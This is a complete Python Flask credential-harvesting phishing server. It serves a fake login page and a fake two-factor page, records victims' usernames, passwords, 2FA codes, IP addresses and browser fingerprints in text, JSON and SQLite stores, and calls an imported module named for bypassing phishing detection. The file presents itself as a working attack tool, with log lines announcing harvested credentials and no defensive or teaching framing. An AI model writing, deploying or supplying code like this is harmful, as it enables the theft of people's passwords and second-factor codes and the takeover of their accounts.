import os
import json
import sqlite3
import platform
from flask import Flask, request, render_template_string, redirect
from datetime import datetime
from utils.logger import logger
from phishing.phish_detection_bypass import bypass_mechanisms

app = Flask(__name__)

# Database Setup
DB_PATH = "harvested_credentials.db"
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT,
                 password TEXT,
                 ip TEXT,
                 user_agent TEXT,
                 fingerprint TEXT,
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# HTML Template (Fake Login Page + Fake 2FA)
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head><title>Secure Login</title></head>
<body>
  <h2>Login</h2>
  <form method="POST">
    <input type="text" name="username" placeholder="Username" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
"""

TWO_FA_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head><title>Two Factor Authentication</title></head>
<body>
  <h2>Enter your 2FA code</h2>
  <form method="POST">
    <input type="text" name="2fa" placeholder="123456" required><br>
    <input type="submit" value="Verify">
  </form>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        fingerprint = get_browser_fingerprint(request)

        log_credential(username, password, ip, user_agent, fingerprint)

        return render_template_string(TWO_FA_PAGE)

    return render_template_string(LOGIN_PAGE)

@app.route('/2fa', methods=['POST'])
def verify_2fa():
    code = request.form.get('2fa')
    logger.info(f"Fake 2FA code submitted: {code}")
    return redirect("https://example.com")

# Fingerprinting function

def get_browser_fingerprint(req):
    headers = {
        "IP": req.remote_addr,
        "User-Agent": req.headers.get('User-Agent'),
        "Accept": req.headers.get('Accept'),
        "Encoding": req.headers.get('Accept-Encoding'),
        "Language": req.headers.get('Accept-Language'),
        "Platform": platform.system()
    }
    return json.dumps(headers)

# Logging

def log_credential(username, password, ip, user_agent, fingerprint):
    timestamp = str(datetime.now())

    # Log to TXT
    with open("credentials_log.txt", "a") as f:
        f.write(f"[{timestamp}] {username}:{password} IP:{ip}\n")

    # Log to JSON
    with open("credentials_log.json", "a") as f:
        json.dump({
            "timestamp": timestamp,
            "username": username,
            "password": password,
            "ip": ip,
            "user_agent": user_agent,
            "fingerprint": fingerprint
        }, f)
        f.write("\n")

    # Log to SQLite
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO credentials (username, password, ip, user_agent, fingerprint) VALUES (?, ?, ?, ?, ?)",
              (username, password, ip, user_agent, fingerprint))
    conn.commit()
    conn.close()

    logger.info(f"[+] Credential harvested: {username}:{password} from {ip}")

    # Trigger phishing bypass stealth mechanism
    bypass_mechanisms(ip, user_agent)

if __name__ == '__main__':
    logger.info("[+] Starting Credential Harvester on http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
